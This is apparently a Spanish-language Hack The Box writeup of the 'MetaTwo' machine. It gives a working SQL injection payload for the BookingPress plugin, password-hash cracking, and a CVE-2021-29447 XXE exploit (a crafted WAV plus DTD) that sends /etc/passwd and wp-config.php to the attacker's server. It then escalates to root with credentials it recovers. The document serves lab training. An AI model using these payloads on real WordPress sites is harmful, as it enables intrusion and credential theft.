---
title: "MetaTwo- HTB Writeup"
layout: single
excerpt: "Maquina de HTB Facil, Wordpress con una vulnerabilidad la cual permite realizar ejecución de codigo remoto a traves de SQLi junto a una vulnerabilidad XEE"
show_date: true
classes: wide
header:
  teaser: https://user-images.githubusercontent.com/63744631/221443247-f9bf1984-026b-4620-8e64-a96072ed7779.png
  teaser_home_page: true
  icon: assets/images/icons/HackTheBox-icon.png
categories:
  - HackTheBox
  - Easy
  - Writeup
tags:
  - XXE
  - Wordpress
  - SQLi
  - GPG
---
![MetaTwo](https://user-images.githubusercontent.com/63744631/221443169-2b7f767a-2e0d-4c90-a233-8100e3904f41.png)

# Enumeración 🔎

empezamos realizando un escaneo rápido a todos los puertos para empezar a enumerar servicios usando el siguiente comando:

```bash
sudo nmap -sS  -T5 --min-rate 5000 -p- 10.129.228.95 -Pn -vvv -oG allports
```

Este comando permite de forma rapida y fiable conseguir los puertos que se encuentran abiertos en la maquina, y usamos los resultados de estos para lanzar otra busqueda mas intensa solo a los puertos que nos interesa.

```bash
sudo nmap -sCV -p21,22,80 -T5 --min-rate 5000 10.129.228.95 -vvv -oN openports
```

Mientras se realiza el escaneo accedemos a la pagina y nos encontramos con una redirección al sitio web metapress.htb por lo que no tenemos acceso a la pagina hasta que no modifiquemos el archivo hosts para poder hacer la resolución del nombre.

Una vez solucionado podemos ver los siguientes datos gracias a wapalyzer, estamos ante un WordPress 5.6.2 una versión antigua por lo que es posible que tenga alguna vulnerabilidad importante, ademas nos da la información sobre el tema en uso Twenty Twenty-one

![image-20230226181008647](https://user-images.githubusercontent.com/63744631/221443320-9f865329-5d9a-4265-9da7-d7ba1328ac65.png)


```bash
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://metapress.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nos quedaremos con esta parte de la respuesta de nmap tras realizar el escaneo mas profundo podemos ver la redirección que vimos anteriormente, y que esta alojado sobre un servidor nginx 1.18.0

# Acceso a la maquina 🔑

Buscando en la pagina podemos encontrar un calendario de eventos el cual se encuentra en una versión bastante antigua. El plugin en cuestión es  **bookingpress-appointment-booking** en la versión 1.0.10

buscando este plugin en internet encontramos una SQL Injection 

[Wordfence BookingPress < 1.0.11 - SQL Injection](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bookingpress-appointment-booking/bookingpress-1011-sql-injection)

> The BookingPress WordPress plugin before 1.0.11 fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection.

Usando esta vulnerabilidad podemos sacar información de la base de datos que esta corriendo actualmente en wordpress es por eso que vamos a aprovecharnos de burpsuite para mandar diferentes consultas para extraer la información que necesitamos.

La consulta sobre la que estaremos haciendo cambios para extraer información es la siguiente:

```sql
action=bookingpress_front_get_category_services&_wpnonce=5c87274b9d&category_id=33&total_service=-7502)+UNION+ALL+SELECT+null,null,user_login,1,2,3,4,5,6+from+wp_users--+-
```

Con esta consulta podemos extraer los usuarios registrados en la base de datos de wordpress actualmente y sus contraseñas cambiando el campo user_login por user_pass.

Se ha podido realizar de este modo debido a que la pagina de WordPress tiene la base de datos sin modificar los campos y utiliza todo por defecto por lo que es muy fácil hacer consultas sin tener acceso a la base de datos.

- admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
- manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70

Pasamos ambos hash a la herramienta john the ripper para ver si puede romper el hash de las contraseñas.

```bash
❯ john -w=/usr/share/wordlists/rockyou.txt pass
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (?)
```

Con esta contraseña y el usuario manager conseguimos acceso al panel de administración de wordpress.

![image-20230226194758567](https://user-images.githubusercontent.com/63744631/221443366-030cd0b2-2fbf-40a6-b004-3b7b7b6f11a5.png)

## CVE 2021-29447

Para seguir vamos a explotar la sección media la cual tiene un CVE en esta versión la cual tiene una vulnerabilidad XXE.

[WordPress XXE Vulnerability in Media Library - CVE-2021-29447 - WPSec](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/)

vamos a utilizar el exploit que aparece en la propia pagina que vemos arriba.

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.67:9123/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

el contenido del archivo .dtd es el siguiente:

```xml-dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.67:9123/?p=%file;'>" >
```

Activamos un servidor en php y subimos el exploit a la pagina de wordpress. Podemos ver el resultado en nuestra terminal.

```xml-dtd
❯ php -S 0.0.0.0:9123
[Sun Feb 26 23:02:47 2023] PHP 8.2.1 Development Server (http://0.0.0.0:9123) started
[Sun Feb 26 23:05:31 2023] 10.129.228.95:35652 Accepted
[Sun Feb 26 23:05:31 2023] 10.129.228.95:35652 [200]: GET /evil.dtd
[Sun Feb 26 23:05:31 2023] 10.129.228.95:35652 Closing
[Sun Feb 26 23:05:31 2023] 10.129.228.95:35654 Accepted
[Sun Feb 26 23:05:31 2023] 10.129.228.95:35654 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=
***********************************************************************************
```

Si decodeamos este resultado que llega en base64 podemos comprobar que nos ha llegado de forma correcta el fichero /etc/passwd con este fichero que vemos debajo podemos ver que tenemos un usuario llamado jnelson.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

Sabiendo que podemos realizar path traversal gracias al exploit que hemos ejecutado podemos descargar el fichero de configuración de wp el cual puede tener información escrita en claro sobre conexiones que se realizan en el servidor.

modificamos la primera linea del fichero evil.dtd para cambiar el archivo que queremos descargar y buscamos con esto el fichero por defecto de nginx que habilita los sitios intentando conseguir de esta forma la ruta donde se encuentra el fichero **wp-config.php** en el servidor.

```xml-dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/nginx/sites-enabled/default">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.67:9123/?p=%file;'>" >
```

```
server {

        listen 80;
        listen [::]:80;

        root /var/www/metapress.htb/blog;

        index index.php index.html;

        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }

        location / {
                try_files $uri $uri/ /index.php?$args;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
        }

        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
                expires max;
                log_not_found off;
        }

}
```

Con este fichero conseguimos la ruta en la que se encuentra almacenada la pagina web de WordPress **/var/www/metapress.htb/blog**.

```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Este fichero nos muestra un usuario de FTP, como vimos al principio de la enumeración tenemos el puerto de ftp abierto por lo que vamos a intentar loguearnos con ese usuario.

```bash
❯ ftp metapress.htb@10.129.228.95
Connected to 10.129.228.95.
220 ProFTPD Server (Debian) [::ffff:10.129.228.95]
331 Password required for metapress.htb
Password:
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||12284|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
226 Transfer complete
ftp>
```

buscando por los diferentes archivos que podemos encontrar en el ftp alcanzamos a un archivo llamado send_email.php el cual contiene la contraseña de jnelson el usuario que vimos anteriormente en /etc/passwd.

```php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
$mail->SMTPSecure = "tls";
$mail->Port = 587;
```

Usando estas credenciales en el servicio SSH nos conectamos correctamente por lo que ahora realizaremos la escalada de privilegios.

```bash
❯ ssh jnelson@10.129.228.95
The authenticity of host '10.129.228.95 (10.129.228.95)' can't be established.
ED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.95' (ED25519) to the list of known hosts.
jnelson@10.129.228.95's password:
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 25 12:51:26 2022 from 10.10.14.23
jnelson@meta2:~$
```

# Escalada de privilegios 🚀

Una vez que accedemos a la maquina comprobamos que no tenemos ningun privilegio de sudo pero si que existe una carpeta oculta en el directorio de jnelson llamada .passpie el cual es un gestor de contraseñas https://github.com/marcwebbie/passpie si accedemos encontramos dentro de esta dos claves gpg.

```bash
jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
```

Usando la herramienta gpg2john podemos trasnsformar la clave gpg en un formato con el cual podemos trabajar con john the ripper

```
gpg2john .keys > gpg.john
```

```
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie)<passpie@local>::.keys
```

```bash
john -w=/usr/share/wordlists/rockyou.txt gpg.john
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)
1g 0:00:00:00 DONE (2023-02-26 23:47) 1.666g/s 293.3p/s 293.3c/s 293.3C/s ginger..chicken
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Gracias a la contraseña conseguida de blink182 leyendo la wiki del programa podemos encontrar un comando para extraer las contraseñas en texto plano ne un archivo para ello ejecutamos el siguiente comando.

```bash
jnelson@meta2:~$ passpie export pass
Passphrase:
jnelson@meta2:~$ cat pass
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

Gracias a esta contraseña conseguimos escalar privilegios a root y conseguir las dos flags de la maquina.

```
jnelson@meta2:~$ su root
Password:
root@meta2:/home/jnelson# cat user.txt ; cat /root/root.txt
1XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX5
6XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXb
root@meta2:/home/jnelson#
```

